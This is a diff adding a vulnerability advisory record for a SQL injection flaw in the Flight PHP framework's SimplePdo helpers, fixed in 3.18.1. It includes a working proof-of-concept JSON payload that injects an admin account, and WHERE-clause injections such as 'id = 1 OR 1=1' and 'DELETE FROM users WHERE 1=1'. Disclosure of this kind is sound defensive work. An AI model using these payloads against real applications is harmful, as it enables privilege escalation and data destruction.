@@ -1,0 +1,190 @@
+advisory_id: GHSA-xwqr-rcqg-22mr
+datasource_id: github_osv/GHSA-xwqr-rcqg-22mr
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-xwqr-rcqg-22mr/GHSA-xwqr-rcqg-22mr.json
+aliases:
+  - CVE-2026-42550
+summary: |
+  Flight vulnerable to SQL Injection via unvalidated identifiers in SimplePdo::insert / update / delete
+  ### Summary
+  `SimplePdo::insert()`, `SimplePdo::update()`, and `SimplePdo::delete()` build SQL statements by concatenating the `$table` argument and the **keys** of the `$data` array directly into the query, with no identifier quoting and no validation. When an application forwards user-controlled data shapes to these helpers — a common and documented pattern, e.g. `$db->insert('users', $request->data->getData())` — an attacker can inject arbitrary SQL by crafting malicious array keys.
+
+  ### Affected code
+  `flight/database/SimplePdo.php`:
+
+  ```php
+  // insert (≈ 320-373)
+  $sql = sprintf(
+      "INSERT INTO %s (%s) VALUES (%s)",
+      $table,                            // raw concat
+      implode(', ', $columns),           // raw array_keys($data)
+      implode(', ', $placeholders)
+  );
+
+  // update (≈ 397-409)
+  $sets[] = "$column = ?";               // $column = user-controlled key
+  $sql = sprintf(
+      "UPDATE %s SET %s WHERE %s",
+      $table,                            // raw
+      implode(', ', $sets),
+      $where
+  );
+
+  // delete (≈ 427-429)
+  $sql = "DELETE FROM $table WHERE $where";
+  ```
+
+  No identifier-quoting helper exists; neither `$table` nor the data keys are validated against a safe-identifier pattern.
+
+  ### Proof of concept
+  A controller does:
+  ```php
+  $db->insert('users', $request->data->getData());
+  ```
+
+  The attacker sends the JSON body:
+  ```json
+  {"name, is_admin) VALUES (?, 1);-- ": "attacker_injected"}
+  ```
+
+  Generated SQL:
+  ```sql
+  INSERT INTO users (name, is_admin) VALUES (?, 1);-- ) VALUES (?)
+  ```
+
+  After the `--` comment, the effective statement `INSERT INTO users (name, is_admin) VALUES (?, 1)` binds the single placeholder `'attacker_injected'`, yielding a row with `is_admin = 1`.
+
+  Reproduced live on an in-memory sqlite database (`testproj/sqli_live2.php`):
+
+  ```
+  id=1  name=alice              is_admin=0
+  id=2  name=attacker_injected  is_admin=1   <-- injected insert
+  ```
+
+  `UPDATE` injection via the `$where` parameter was also reproduced: `$db->update('users', ['is_admin' => 1], "id = 1 OR 1=1")` flips admin on every row.
+
+  ### Impact
+  - **Privilege escalation** on any signup / register endpoint that forwards request data to `insert()` (attacker creates an administrative account in a single request).
+  - Arbitrary column write through `update()` keys.
+  - Data destruction and exfiltration through the `$where` parameter (`DELETE FROM users WHERE 1=1`, UNION-based exfil, etc.).
+
+  ### Patch (fixed in `3.18.1`, commit `b8dd23a`)
+  A new `requireSafeIdentifier()` helper validates table names and column names against `^[A-Za-z_][A-Za-z0-9_]*$` before they are interpolated into the SQL string. The `$where` parameter remains raw SQL as documented — parameterized values passed alongside it continue to be bound safely.
+
+  ### Credit
+  Discovered by **@Rootingg**.
+impacted_packages:
+  - purl: pkg:composer/flightphp/core
+    affected_versions: vers:composer/<3.18.1
+    fixed_versions: vers:composer/3.18.1
+    affected_packages:
+      - pkg:composer/flightphp/core@1.0.0
+      - pkg:composer/flightphp/core@1.1.0
+      - pkg:composer/flightphp/core@1.1.5
+      - pkg:composer/flightphp/core@1.1.10
+      - pkg:composer/flightphp/core@1.2.0
+      - pkg:composer/flightphp/core@1.2.13
+      - pkg:composer/flightphp/core@1.2.14
+      - pkg:composer/flightphp/core@1.2.15
+      - pkg:composer/flightphp/core@1.2.17
+      - pkg:composer/flightphp/core@1.2.18
+      - pkg:composer/flightphp/core@1.2.19
+      - pkg:composer/flightphp/core@1.2.20
+      - pkg:composer/flightphp/core@1.2.21
+      - pkg:composer/flightphp/core@1.2.22
+      - pkg:composer/flightphp/core@1.3.0
+      - pkg:composer/flightphp/core@1.3.1
+      - pkg:composer/flightphp/core@1.3.2
+      - pkg:composer/flightphp/core@1.3.3
+      - pkg:composer/flightphp/core@1.3.4
+      - pkg:composer/flightphp/core@1.3.5
+      - pkg:composer/flightphp/core@1.3.7
+      - pkg:composer/flightphp/core@1.3.8
+      - pkg:composer/flightphp/core@1.3.9
+      - pkg:composer/flightphp/core@2.0.0
+      - pkg:composer/flightphp/core@2.0.1
+      - pkg:composer/flightphp/core@3.0.0
+      - pkg:composer/flightphp/core@3.0.1
+      - pkg:composer/flightphp/core@3.0.2
+      - pkg:composer/flightphp/core@3.1.0
+      - pkg:composer/flightphp/core@3.1.1
+      - pkg:composer/flightphp/core@3.2.0
+      - pkg:composer/flightphp/core@3.3.0
+      - pkg:composer/flightphp/core@3.4.0
+      - pkg:composer/flightphp/core@3.4.1
+      - pkg:composer/flightphp/core@3.4.2
+      - pkg:composer/flightphp/core@3.5.0
+      - pkg:composer/flightphp/core@3.5.2
+      - pkg:composer/flightphp/core@3.5.3
+      - pkg:composer/flightphp/core@3.6.0
+      - pkg:composer/flightphp/core@3.6.1
+      - pkg:composer/flightphp/core@3.6.2
+      - pkg:composer/flightphp/core@3.7.0
+      - pkg:composer/flightphp/core@3.7.1
+      - pkg:composer/flightphp/core@3.7.2
+      - pkg:composer/flightphp/core@3.8.0
+      - pkg:composer/flightphp/core@3.8.1
+      - pkg:composer/flightphp/core@3.9.0
+      - pkg:composer/flightphp/core@3.10.0
+      - pkg:composer/flightphp/core@3.10.1
+      - pkg:composer/flightphp/core@3.11.0
+      - pkg:composer/flightphp/core@3.11.1
+      - pkg:composer/flightphp/core@3.12.0
+      - pkg:composer/flightphp/core@3.13.0
+      - pkg:composer/flightphp/core@3.13.1
+      - pkg:composer/flightphp/core@3.14.0
+      - pkg:composer/flightphp/core@3.15.0
+      - pkg:composer/flightphp/core@3.15.1
+      - pkg:composer/flightphp/core@3.15.2
+      - pkg:composer/flightphp/core@3.15.3
+      - pkg:composer/flightphp/core@3.16.0
+      - pkg:composer/flightphp/core@3.16.1
+      - pkg:composer/flightphp/core@3.17.0
+      - pkg:composer/flightphp/core@3.17.1
+      - pkg:composer/flightphp/core@3.17.2
+      - pkg:composer/flightphp/core@3.17.3
+      - pkg:composer/flightphp/core@3.17.4
+      - pkg:composer/flightphp/core@3.18.0
+    fixed_packages:
+      - pkg:composer/flightphp/core@3.18.1
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/flightphp/core
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/flightphp/core
+        commit: b8dd23aaa828cb289fa3c84e75b2a3717cab50b0
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '8.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-xwqr-rcqg-22mr/GHSA-xwqr-rcqg-22mr.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-89
+references:
+  - url: https://github.com/flightphp/core
+    reference_type:
+    reference_id:
+  - url: https://github.com/flightphp/core/commit/b8dd23aaa828cb289fa3c84e75b2a3717cab50b0
+    reference_type:
+    reference_id:
+  - url: https://github.com/flightphp/core/releases/tag/v3.18.1
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-42550
+    reference_type:
+    reference_id: CVE-2026-42550
+  - url: https://github.com/flightphp/core/security/advisories/GHSA-xwqr-rcqg-22mr
+    reference_type:
+    reference_id: GHSA-xwqr-rcqg-22mr
+exploits: []
